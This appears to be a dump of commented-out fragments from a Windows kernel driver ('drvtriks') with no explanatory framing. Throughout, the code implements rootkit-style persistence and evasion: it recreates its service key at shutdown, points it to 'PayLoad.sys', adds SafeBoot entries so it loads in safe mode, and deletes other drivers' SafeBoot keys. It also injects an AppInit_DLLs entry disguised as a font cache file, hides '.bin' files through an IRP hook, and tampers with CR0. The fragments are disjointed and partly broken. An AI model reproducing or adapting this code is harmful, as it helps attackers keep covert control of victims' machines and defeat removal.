//}
//status = ZwOpenKey(&hKey3, DELETE, &objectAttributes3);
//if (!NT_SUCCESS(status)){
//	DbgPrint("a fail occurred. 0x%lX", status);
//}



//
//else{

//	//ZwClose(hKey);
//	status = ZwDeleteKey(hKey);
//	if (!NT_SUCCESS(status)){
//		DbgPrint("another fail occurred. 0x%lX", status);
//	}
//	status = STATUS_SUCCESS;
//}

//KeDelayExecutionThread(KernelMode, FALSE, &interval);
//DbgPrint("zfzbfufbzbfzbf %llX --- %llX --- %llX --- %llX", ((PWORK_QUEUE_ITEM)pStartContext)->List.Flink, ((PWORK_QUEUE_ITEM)pStartContext)->List.Blink, ((PWORK_QUEUE_ITEM)pStartContext)->Parameter, ((PWORK_QUEUE_ITEM)pStartContext)->WorkerRoutine);


//void MyLoadImageNotifyRoutine(PUNICODE_STRING pFullImageName, HANDLE hPid, PIMAGE_INFO pImageInfo){
//	UNREFERENCED_PARAMETER(hPid);
//	UNREFERENCED_PARAMETER(pImageInfo);
////	static BOOL flag;
//	if (NULL != pFullImageName){
//		//pImageInfo->ImageBase
//		//if (TRUE == flag){
//		//	if (TRUE == mystrcmp(L"fwremotesvr.dll", pFullImageName->Buffer, pFullImageName->Length, METHOD_END)){
//		//		KIRQL oldIrql;
//		//		KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//
//		//		//KeStallExecutionProcessor(1000000);
//		//		KeLowerIrql(oldIrql);
//		//	}
//		//	else if (TRUE == mystrcmp(L"svchost.exe", pFullImageName->Buffer, pFullImageName->Length, METHOD_END)){
//		//		flag = FALSE;
//		//	}
//		//}
//		////DbgPrint("%wZ", *pFullImageName);
//		//if (TRUE == mystrcmp(L"svchost.exe", pFullImageName->Buffer, pFullImageName->Length, METHOD_END)){
//		//	flag = TRUE;
//		//}
//	}
//
//}

//NTSTATUS MyIrpMjCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp){
//	UNREFERENCED_PARAMETER(pDeviceObject);
//	UNREFERENCED_PARAMETER(pIrp);
//	NTSTATUS ntStatus = STATUS_NO_SUCH_FILE;
//	//DbgPrint("bleh.");
//	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);
//	if (NULL != irpStack){
//		PFILE_OBJECT pFileObject = irpStack->FileObject;
//		if (NULL != pFileObject){
//			//DbgPrint("%wZ", pFileObject->FileName);
//			if (mystrcmp(L".bin", pFileObject->FileName.Buffer, pFileObject->FileName.Length, METHOD_END)){
//				pIrp->IoStatus.Status = 0xC0000001 + pFileObject->FileName.Length;
//				//pIrp->IoStatus.Status = 0xC0000156;
//				return pIrp->IoStatus.Status;
//			}
//		}
//	}
//#pragma warning(disable:4054)	//We are suspected of trying to alter functions
//	//ntStatus = ((PDRIVER_DISPATCH)pDeviceObject->DriverObject->DriverStartIo)(pDeviceObject, pIrp);
//	ntStatus = ((PDRIVER_DISPATCH)((PULONGLONG)pDeviceObject->DriverObject->DriverStartIo)[0])(pDeviceObject, pIrp);
//	//PFILE_OBJECT pFileObject = IoGetCurrentIrpStackLocation(Irp)->FileObject;
//	return ntStatus;
//}

//NTSTATUS MyIrpMjShutdown(PDEVICE_OBJECT pDeviceObject, PIRP pIrp){
//	UNREFERENCED_PARAMETER(pDeviceObject);
//	UNREFERENCED_PARAMETER(pIrp);
//	//WCHAR szImagePath[] = L"System32\\drivers\\drvtrics.sys";
//	
//	WCHAR szRegPath[] = L"drvtriks";
//	WCHAR szRegPath2[] = L"\\drvtriks";
//	WCHAR szRegPath3[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtriks";
//	//WCHAR szRegPath4[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager";
//	//WCHAR szBootPath[] = L"Project1.exe\0\0";
//	//L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtricks"
////	WCHAR cString64[] = L"C:\\Windows\\Fonts\\StaticFonts.dat";
////	WCHAR cString32[] = L"C:\\Windows\\Fonts\\FontCache.dat";
////	WCHAR regPath64[] = L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
////	WCHAR regPath32[] = L"\\Registry\\Machine\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
//	//ULONG type = 1;
//	//ULONG start = 0;
//
//	NTSTATUS ntStatus1 = STATUS_NO_SUCH_FILE;
//	NTSTATUS ntStatus2 = STATUS_NO_SUCH_FILE;
//	NTSTATUS ntStatus3 = STATUS_NO_SUCH_FILE;
//	//NTSTATUS ntStatus4 = STATUS_NO_SUCH_FILE;
//
//	//NTSTATUS ntStatus1 = STATUS_NO_SUCH_FILE;
//
//	//DbgPrint("bleh.");
//	//PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);
//	//if (NULL != irpStack){
//	//	PFILE_OBJECT pFileObject = irpStack->FileObject;
//	//	if (NULL != pFileObject){
//	//		DbgPrint("%wZ", pFileObject->FileName);
//	//		if (mystrcmp(L"config\\sytem", pFileObject->FileName.Buffer, pFileObject->FileName.Length, METHOD_END)){
//	//			pIrp->IoStatus.Status = 0xC0000001 + pFileObject->FileName.Length;
//	//			return pIrp->IoStatus.Status;
//	//		}
//	//	}
//	//}
//	DbgPrint("IRP_MJ_SHUTDOWN received!");
//	ntStatus1 = RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, szRegPath);
//	ntStatus2 = RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, szRegPath2);
//	ntStatus3 = RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, szRegPath3);
//	//ntStatus4 = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, L"\\drvtriks", L"ImagePath", REG_SZ, (PVOID)szImagePath, sizeof(szImagePath));
//	
//	//RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, L"drvtriks", L"Type", REG_DWORD, (PVOID)&type, sizeof(ULONG));
//
//	//myRtlWriteRegistryValue(0, regPath64, L"AppInit_DLLs", REG_SZ, (PVOID)cString64, sizeof(cString64));
//	//myRtlWriteRegistryValue(0, regPath64, L"LoadAppInit_DLLs", REG_DWORD, (PVOID)&dwLoadAppInit_DLLs, sizeof(DWORD));
//	//myRtlWriteRegistryValue(0, regPath64, L"RequireSignedAppInit_DLLs", REG_DWORD, (PVOID)&dwRequireSignedAppInit_DLLs, sizeof(DWORD));
//	//myRtlWriteRegistryValue(0, regPath32, L"AppInit_DLLs", REG_SZ, (PVOID)cString32, sizeof(cString32));
//	//myRtlWriteRegistryValue(0, regPath32, L"LoadAppInit_DLLs", REG_DWORD, (PVOID)&dwLoadAppInit_DLLs, sizeof(DWORD));
//	//myRtlWriteRegistryValue(0, regPath32, L"RequireSignedAppInit_DLLs", REG_DWORD, (PVOID)&dwRequireSignedAppInit_DLLs, sizeof(DWORD));
//	//KeBugCheck(0x0000DEAD);
//	//ntStatus = ((PDRIVER_DISPATCH)((PULONGLONG)pDeviceObject->DriverObject->DriverStartIo)[1])(pDeviceObject, pIrp);
//	//PFILE_OBJECT pFileObject = IoGetCurrentIrpStackLocation(Irp)->FileObject;
//	//KeBugCheck(0x0000DEAD);
//	//pIrp->
//	//NTSTATUS bugCode = 0x0;
//	ULONG ioctl = 0x0;
//
//	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);
//	if (NULL != irpStack){
//		//PFILE_OBJECT pFileObject = irpStack->FileObject;
//		//if (NULL != pFileObject){
//		//	//DbgPrint("%wZ", pFileObject->FileName);
//		//	if (mystrcmp(L".bin", pFileObject->FileName.Buffer, pFileObject->FileName.Length, METHOD_END)){
//		//		pIrp->IoStatus.Status = 0xC0000001 + pFileObject->FileName.Length;
//		//		//pIrp->IoStatus.Status = 0xC0000156;
//		//		return pIrp->IoStatus.Status;
//		//	}
//		//}
//		ioctl = irpStack->Parameters.DeviceIoControl.IoControlCode;
//		//switch (ioctl) {
//		//case 0x00294144:{
//		//					RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUPEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
//		//					break;
//		//}
//		//case 0x002D1400:{
//		//					RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUPEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
//		//					break;
//		//}
//		//default:
//		//	break;
//		//}
//		
//		//ZwOpenKey()
//		if (0x00294144 == ioctl || 0x002D1400 == ioctl) {
//			//for (;;){
//			//	RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUPEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
//			//}
//
//			//WORK_QUEUE_ITEM workQueueItem;
//			////workQueueItem.
//			//	//ExQueueWorkItem();
//			//	WORKER_THREAD_ROUTINE workerThreadRoutine;
//			//	workerThreadRoutine->
//			//ExQueueWorkItem
//			//KeBugCheckEx(status, 0x0, 0x0, 0x0, 0x0);
//			//UNREFERENCED_PARAMETER(status);
//		}
//	}
//	//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUPEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
//	//KeBugCheckEx(bugCode, (ULONG_PTR)ntStatus1, (ULONG_PTR)ntStatus2, (ULONG_PTR)ntStatus3, (ULONG_PTR)ntStatus4);
//
//	//return ntStatus1*ntStatus2*ntStatus3*ntStatus4;
//	//NTSTATUS ntStatus = ((PIRP)NULL)->Flags;
//	NTSTATUS ntStatus = ((PDRIVER_DISPATCH)((PULONGLONG)pDeviceObject->DriverObject->DriverStartIo)[0])(pDeviceObject, pIrp);
//	//PFILE_OBJECT pFileObject = IoGetCurrentIrpStackLocation(Irp)->FileObject;
//	return ntStatus;
//}	//PEPROCESS pEprocess;
//NTSTATUS ntStatus;
//WCHAR szRegPath4[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager";
//WCHAR szBootPath[] = L"Project1.exe\0\0";
//PUNICODE_STRING pProcessName = NULL;
//UNICODE_STRING uTestStr;
//BOOL flag = FALSE;

//RtlInitUnicodeString(&uTestStr, L"\\RPC Control\\ipsec");
//DbgPrint("pStartContext = %llX", (ULONGLONG)pStartContext);
//KIRQL oldIrql;
//KeRaiseIrql(APC_LEVEL, &oldIrql);

//HANDLE hServiceKey;
//OBJECT_ATTRIBUTES objectAttributes;
//UNICODE_STRING uServiceRegPath;




////WCHAR destStr[107];// = { L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" };


//

////WCHAR string1 = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\";
////WCHAR value1 = { string1, L"ewde" };
////WCHAR value1[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10319}";
////WCHAR value2[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{4D36E967-E325-11CE-BFC1-08002BE10319}";
////WCHAR value3[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}";
////WCHAR value4[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}";
////WCHAR value5[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}";
////WCHAR value6[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}";
////WCHAR value7[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}";
////WCHAR value8[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}";



////RtlInitUnicodeString(&uServiceRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\drvtriks");
////InitializeObjectAttributes(&objectAttributes, &uServiceRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

////ZwOpenKey(&hServiceKey, DELETE, &objectAttributes);
//////if (!NT_SUCCESS(status)){
//////	DbgPrint("a fail occurred. 0x%lX", status);
//////}
////ZwDeleteKey(hServiceKey);

////RtlInitUnicodeString(&uServiceRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\drvtriks");
////InitializeObjectAttributes(&objectAttributes, &uServiceRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

////ZwOpenKey(&hServiceKey, DELETE, &objectAttributes);
//////if (!NT_SUCCESS(status)){
//////	DbgPrint("a fail occurred. 0x%lX", status);
//////}
////ZwDeleteKey(hServiceKey);

////ExQueueWorkItem(pStartContext[0], DelayedWorkQueue);

//NTSTATUS MyGenericDispatchPassDown(PDEVICE_OBJECT pLowerDeviceObject, PIRP pIrp){
//	DbgPrint("Entering DispatchPassDown Routine...\n");
//	//pass the irp down to the target without touching it   
//	IoSkipCurrentIrpStackLocation(pIrp);
//	return IofCallDriver(storahci_device, pIrp);
//}//end DriverDispatcher   
//!!!THIS CODE FULLY WORKING!!!


//NTSTATUS ntStatus;
//UNICODE_STRING uSenseStr;
//HANDLE hKey;
//OBJECT_ATTRIBUTES objectAttributes;
//UNICODE_STRING uServicePath;
//UNICODE_STRING uKeyName;

//WCHAR value1[108];
//WCHAR value2[108];
//WCHAR value3[108];
//WCHAR value4[108];
//WCHAR value5[108];
//WCHAR value6[108];
//WCHAR value7[108];
//WCHAR value8[108];

//ULONG serviceStart = 0x00000001;
//ULONG serviceType = 0x00000001;
//BOOL flag = FALSE;

//interval.QuadPart = -500000;

//WCHAR szServicePath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtriks";
//WCHAR szServiceImage[] = L"\\??\\C:\\PayLoad.sys";
//WCHAR szSafeBootData1[] = L"DiskDrive";
//WCHAR szSafeBootData2[] = L"Volume";
//WCHAR rawStr[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\";

//wcscat_s(value1, sizeof(value1) / sizeof(WCHAR), rawStr);
//wcscat_s(value1, sizeof(value1) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(value2, sizeof(value2) / sizeof(WCHAR), rawStr);
//wcscat_s(value2, sizeof(value2) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(value3, sizeof(value3) / sizeof(WCHAR), rawStr);
//wcscat_s(value3, sizeof(value3) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(value4, sizeof(value4) / sizeof(WCHAR), rawStr);
//wcscat_s(value4, sizeof(value4) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(value5, sizeof(value5) / sizeof(WCHAR), rawStr);
//wcscat_s(value5, sizeof(value5) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(value6, sizeof(value6) / sizeof(WCHAR), rawStr);
//wcscat_s(value6, sizeof(value6) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(value7, sizeof(value7) / sizeof(WCHAR), rawStr);
//wcscat_s(value7, sizeof(value7) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");
//wcscat_s(value8, sizeof(value8) / sizeof(WCHAR), rawStr);
//wcscat_s(value8, sizeof(value8) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");

//PRTL_OSVERSIONINFOW pOsInfo = (PRTL_OSVERSIONINFOW)ExAllocatePool(NonPagedPool, sizeof(RTL_OSVERSIONINFOW));
////pOsInfo->
//pOsInfo->dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
//RtlGetVersion(pOsInfo);
//if (9200 <= pOsInfo->dwBuildNumber){
//	RtlInitUnicodeString(&uSenseStr, L"\\RPC Control\\ipsec");
//}
//else{
//	RtlInitUnicodeString(&uSenseStr, L"\\RPC Control\\trkwks");
//}
//
//DbgPrint("%ld, %ld, %ld", pOsInfo->dwBuildNumber, pOsInfo->dwMajorVersion, pOsInfo->dwMinorVersion);
//win81 = TRUE;
//continue;
//}else if (STATUS_OBJECT_NAME_NOT_FOUND == ntStatus){
//	if (TRUE == flag){
//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value1, NULL, REG_SZ, szSafeBootData1, sizeof(szSafeBootData1));
//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value2, NULL, REG_SZ, szSafeBootData1, sizeof(szSafeBootData1));
//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value3, NULL, REG_SZ, szSafeBootData2, sizeof(szSafeBootData2));
//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value4, NULL, REG_SZ, szSafeBootData2, sizeof(szSafeBootData2));

//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szServicePath, L"ImagePath", REG_EXPAND_SZ, szServiceImage, sizeof(szServiceImage));
//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szServicePath, L"Type", REG_DWORD, &serviceType, sizeof(ULONG));
//		//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szServicePath, L"Start", REG_DWORD, &serviceStart, sizeof(ULONG));

//		//RtlInitUnicodeString(&uKeyName, value5);
//		//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//		//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//		//ZwDeleteKey(hKey);

//		//RtlInitUnicodeString(&uKeyName, value6);
//		//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//		//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//		//ZwDeleteKey(hKey);

//		//RtlInitUnicodeString(&uKeyName, value7);
//		//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//		//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//		//ZwDeleteKey(hKey);

//		//RtlInitUnicodeString(&uKeyName, value8);
//		//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//		//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//		//ZwDeleteKey(hKey);

//		//RtlInitUnicodeString(&uServicePath, szServicePath);
//		//InitializeObjectAttributes(&objectAttributes, &uServicePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//		//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//		////ZwFlushKey(hKey);
//		//ZwClose(hKey);
//		DbgPrint("saved.");
//		return;
//	}
//}

//ntStatus2 = ObReferenceObjectByName(&uTestStr2, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, *LpcPortObjectType, KernelMode, NULL, &pObject);
//ZwQ
//	RtlGetVersion
//else if (NT_SUCCESS(ntStatus2)){
//	ObDereferenceObject(pObject2);
//	flag = TRUE;
//}

//DbgPrint("Process name: %wZ", *pProcessName);
//if (TRUE == mystrcmp(L"smss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//	break;
//}
//if (TRUE == mystrcmp(L"svchost.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//	break;
//}
//if (TRUE == mystrcmp(L"csrss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//	break;					
//}
//flag = mystrcmp(L"ssmss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END) ||
//	mystrcmp(L"winlogon.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END) ||
//	mystrcmp(L"cssrss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END);
//if (TRUE == flag){
//	break;
//}
//PVOID pObject = NULL;		
//ntStatus = ObReferenceObjectByName(&uSenseStr, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, *PsProcessType, KernelMode, NULL, &pObject);
//if (NT_SUCCESS(ntStatus)){
//ObDereferenceObject(pObject);
//DbgPrint("The desired object has been found successfully! :) :) :)");
//DbgPrint("Object resides @ 0x%llX!", pObject);
//break;
//}


//CLIENT_ID cid;
//HANDLE hProcess;
//cid.UniqueThread = 0;
//RtlInitUnicodeString(&pProcessName, L"notepad.exe");
//ntStatus = PsLookupProcessByProcessId((HANDLE)2272, &pEprocess);
//PsLookupThreadByThreadId()
//ZwOpenProcess//		//OBJECT_ATTRIBUTES objectAttriboutes;
//		//CLIENT_ID cid;
//		//cid.UniqueThread = 0;
//cid.UniqueProcess = (HANDLE)i;
//cid.UniqueThread = (HANDLE)(i + 4);
//ntStatus = ZwOpenProcess(&hProcess, GENERIC_ALL, &objectAttributes, &cid);
//if (!NT_SUCCESS(ntStatus)){
//	DbgPrint("For reason 0x%lX this process couldn't be opened.");
//}
//else{
//	ZwClose(hProcess);
//}
//		//InitializeObjectAttributes(&objectAttriboutes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

//NTSTATUS NtOpenThread(
//	OUT PHANDLE             ThreadHandle,
//	IN ACCESS_MASK          AccessMask,
//	IN POBJECT_ATTRIBUTES   ObjectAttributes,
//	IN PCLIENT_ID           ClientId);



//typedef NTSTATUS(*PARB_FUNC_PTR)(void);
//
//typedef union _ARB_PTR{
//	PARB_FUNC_PTR fpArbFuncPtr;
//	PVOID pArbDataPtr;
//}ARB_PTR;

//ARB_PTR arbitraryPointer, arbitraryPointer2;
//arbitraryPointer.fpArbFuncPtr = (PARB_FUNC_PTR)MyWorkerThread;
//arbitraryPointer2.fpArbFuncPtr = (PARB_FUNC_PTR)MyLoadImageNotifyRoutine;
//NTSTATUS Funktion(void);
//VOID OnUnload(IN PDRIVER_OBJECT pDriverObject);
//void Thread2(void);
//DbgPrint("%s", g_pMyData);
//DbgPrint("new Thread code @ %llX!", g_pMyData + diff);
//DbgPrint("new Notify code @ %llX!", g_pMyData + diff2);
//DbgPrint("poiter: %llX", pointer);
//DbgPrint("pointer2: %llX", pointer2);
//DbgPrint("DriverBaseName: %wZ", *drvTblBaseNameEntry);
//pDriverObject->DriverUnload = OnUnload;
//NTSTATUS Funktion(void){
//	//KEVENT
//	//KIRQL oldIrql;
//	ULONGLONG cr0status;
//	DbgPrint("Hallo Welt!");
//	__nop();
//	__nop();
//	//_disable();
//	__nop();
//	cr0status = __readcr0();
//	DbgPrint("%llX", cr0status);
//	//cr0status &= 0xFFFFFFFFFFFFFFFE;
//	//__writecr0(cr0status);
//	//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	//__halt();
//	__nop();
//	return STATUS_SUCCESS;
//}
//ULONGLONG cr0status;
//HANDLE hThread;
//for (int i = 0; i < 66536*2; i++){
////cr0status = __readcr0();
////DbgPrint("Hallo Welt from Thread!");
//
//PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, (PKSTART_ROUTINE)Thread2, NULL);

//cr0status &= 0x7FFFFFFFFFFFFFFF;
//__writecr0(0x0);
//try{
//	//__writecr3((ULONGLONG)(&interval));
//	_disable();
//}except(EXCEPTION_EXECUTE_HANDLER){
//	DbgPrint("Failed to write crucial data!");
//	goto Ende;
//}

//Ende:
//if (TRUE == g_terminateThread){
//	PsTerminateSystemThread(0x0);
//}
//return;
//__writecr4(0x0);
//__writecr8(0x0);
//void Thread2(void){
//	LARGE_INTEGER interval1;
//	//ULONGLONG cr0status;
//	interval1.QuadPart = -1000000;
//	//interval2.QuadPart = -200;
//	for (;;){
//		//cr0status = __readcr0();
//		//DbgPrint("Hallo Welt from Thread2!");
//		//_disable();
//		//KeStallExecutionProcessor(19000);
//		KeDelayExecutionThread(KernelMode, FALSE, &interval1);
//		//_enable();
//		//KeStallExecutionProcessor(990);
//		//KeDelayExecutionThread
//		//KeDelayExecutionThread(KernelMode, FALSE, &interval2);
//		//cr0status &= 0x7FFFFFFFFFFFFFFF;
//		//__writecr0(0x0);
//		//try{
//		//	//__writecr3((ULONGLONG)(&interval));
//		//	_disable();
//		//}except(EXCEPTION_EXECUTE_HANDLER){
//		//	DbgPrint("Failed to write crucial data!");
//		//	goto Ende;
//		//}
//
//		//Ende:
//		//if (TRUE == g_terminateThread){
//		//	PsTerminateSystemThread(0x0);
//		//}
//		//return;
//		//__writecr4(0x0);
//		//__writecr8(0x0);
//	}
//}




//VOID OnUnload(IN PDRIVER_OBJECT pDriverObject){
//	UNREFERENCED_PARAMETER(pDriverObject);
//	DbgPrint("Unload driver successful!");
//}

//extern POBJECT_TYPE* IoDriverObjectType;
//typedef struct _WORK_ITEM_ARRAY {
//	PWORK_QUEUE_ITEM pWorkItem1;
//	PWORK_QUEUE_ITEM pWorkItem2;
//} WORK_ITEM_ARRAY, *PWORK_ITEM_ARRAY;

//PEPROCESS pEprocess;
//WCHAR szRegPath4[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager";
//WCHAR szBootPath[] = L"Project1.exe\0\0";
//PUNICODE_STRING pProcessName = NULL;
//	PVOID pObject = NULL;
//WCHAR szSafeBootData[] = L"Driver";
//WCHAR szRegPath4[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager";
//WCHAR szBootPath[] = L"Project1.exe\0\0";
//NTSTATUS status1, status2, status3;
//RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, szServicePath);
//RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, );
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\File system", NULL, REG_SZ, szSafeBootData, sizeof(szSafeBootData));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\File system", NULL, REG_SZ, szSafeBootData, sizeof(szSafeBootData));
//WCHAR value1[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10319}";
//WCHAR value2[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{4D36E967-E325-11CE-BFC1-08002BE10319}";
//WCHAR value3[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}";
//WCHAR value4[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}";
//WCHAR value5[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}";
//WCHAR value6[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}";
//WCHAR value7[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}";
//WCHAR value8[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}";

//ntStatus = ObReferenceObjectByName(&uTestStr, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, *LpcPortObjectType, KernelMode, NULL, &pObject);
//ntStatus = ObReferenceObjectByName(&uTestStr, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, *ExEventObjectType, KernelMode, NULL, &pObject);
//if (NT_SUCCESS(ntStatus)){
//	ObDereferenceObject(pObject);
//	//DbgPrint("Alpc Port found.");
//	flag = TRUE;
//}
//RtlInitUnicodeString(&uTestStr, L"\\KernelObjects\\SuperfetchParametersChanged");
//DbgPrint("pStartContext = %llX", (ULONGLONG)pStartContext);
//DbgPrint("Hallo Welt!");
//__nop();

//KeDelayExecutionThread(KernelMode, FALSE, &interval);

//BOOL flag = FALSE;
//for (ULONG i = 0; i < 20000; i += 4){
//	pEprocess = NULL;
//	ntStatus = PsLookupProcessByProcessId((HANDLE)i, &pEprocess);
//	//ntStatus = PsLookupProcessByProcessId((HANDLE)2272, &pEprocess);

//	if (NT_SUCCESS(ntStatus)){
//		SeLocateProcessImageName(pEprocess, &pProcessName);
//		//DbgPrint("Process name: %wZ", *pProcessName);
//		//if (TRUE == mystrcmp(L"smss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//		//	break;
